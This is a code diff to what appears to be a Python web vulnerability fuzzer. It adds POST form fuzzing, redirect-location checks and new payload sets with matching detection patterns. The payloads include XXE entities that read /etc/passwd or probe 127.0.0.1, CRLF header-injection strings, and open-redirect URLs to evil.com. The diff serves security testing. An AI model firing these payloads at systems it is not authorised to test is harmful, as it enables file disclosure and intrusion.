@@ -76,8 +76,16 @@ FUZZ_PAYLOADS: dict[str, list[str]] = {
     "open_redirect": [
         "https://evil.com",
         "//evil.com",
-        "/\\evil.com",
+        r"/\evil.com",
         "http://evil.com",
+    ],
+    "xxe": [
+        "<?xml version='1.0'?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
+        "<?xml version='1.0'?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM 'http://127.0.0.1/'>]><root>&xxe;</root>",
+    ],
+    "crlf": [
+        "%0d%0aX-Injected-Header: vuln-sentinel",
+        "%0d%0aSet-Cookie: vuln_sentinel=1",
     ],
 }
 
@@ -104,6 +112,13 @@ EVIDENCE_PATTERNS: dict[str, list[tuple[str, str]]] = {
     "ssrf": [
         ("metadata", r"(instance-id|ami-id|local-hostname)"),
         ("internal_response", r"(127\.0\.0\.1|localhost|internal server)"),
+    ],
+    "xxe": [
+        ("doctype", r"(doctype|entity|external entity|xml parsing error)"),
+        ("passwd_content", r"root:.*:0:0:"),
+    ],
+    "crlf": [
+        ("header_injection", r"(x-injected-header|set-cookie: vuln_sentinel=1)"),
     ],
 }
 
@@ -142,6 +157,8 @@ class FuzzEngine:
             "traversal",
             "ssrf",
             "open_redirect",
+            "xxe",
+            "crlf",
         ]
         self.request_timeout = request_timeout
         self.max_params = max_params
@@ -154,6 +171,7 @@ class FuzzEngine:
         headers: dict[str, str] | None = None,
         body: str = "",
         content_type: str = "",
+        method: str = "GET",
     ) -> list[FuzzResult]:
         """对单个 URL 的参数执行 fuzz。"""
         params = _extract_params(url, body, content_type)
@@ -165,6 +183,8 @@ class FuzzEngine:
         results: list[FuzzResult] = []
 
         base_url = url.split("?")[0]
+        request_method = (method or "GET").upper()
+        send_as_form = request_method == "POST" and bool(body) and bool(content_type)
         for param_name, values in param_items:
             for technique in self.techniques:
                 for payload in FUZZ_PAYLOADS.get(technique, []):
@@ -172,14 +192,34 @@ class FuzzEngine:
                         base_url, params, param_name, payload
                     )
                     try:
-                        resp = await client.get(
-                            fuzz_url,
-                            headers=headers,
-                            follow_redirects=self.follow_redirects,
-                            timeout=self.request_timeout,
-                        )
+                        request_kwargs = {
+                            "headers": headers,
+                            "follow_redirects": self.follow_redirects,
+                            "timeout": self.request_timeout,
+                        }
+                        if send_as_form:
+                            request_body = urlencode(
+                                {
+                                    k: (payload if k == param_name else (v[0] if v else ""))
+                                    for k, v in params.items()
+                                },
+                                safe="",
+                            )
+                            form_headers = dict(headers or {})
+                            form_headers.setdefault(
+                                "content-type", "application/x-www-form-urlencoded"
+                            )
+                            request_kwargs["headers"] = form_headers
+                            request_kwargs["content"] = request_body.encode()
+                            resp = await client.post(base_url, **request_kwargs)
+                        else:
+                            resp = await client.get(fuzz_url, **request_kwargs)
                         snippet = resp.text[:500]
                         evidence = self._detect_evidence(technique, payload, snippet)
+                        if not evidence and technique == "open_redirect":
+                            location = (resp.headers.get("location") or "").lower()
+                            if resp.status_code in {301, 302, 303, 307, 308} and ("evil.com" in location or payload.lower() in location):
+                                evidence = "redirect_location"
                         if evidence:
                             results.append(
                                 FuzzResult(
@@ -192,7 +232,7 @@ class FuzzEngine:
                                     evidence_type=evidence,
                                     confidence="high"
                                     if evidence
-                                    in ("sql_error", "cmd_output", "passwd_content")
+                                    in ("sql_error", "cmd_output", "passwd_content", "doctype", "header_injection", "redirect_location")
                                     else "medium",
                                 )
                             )
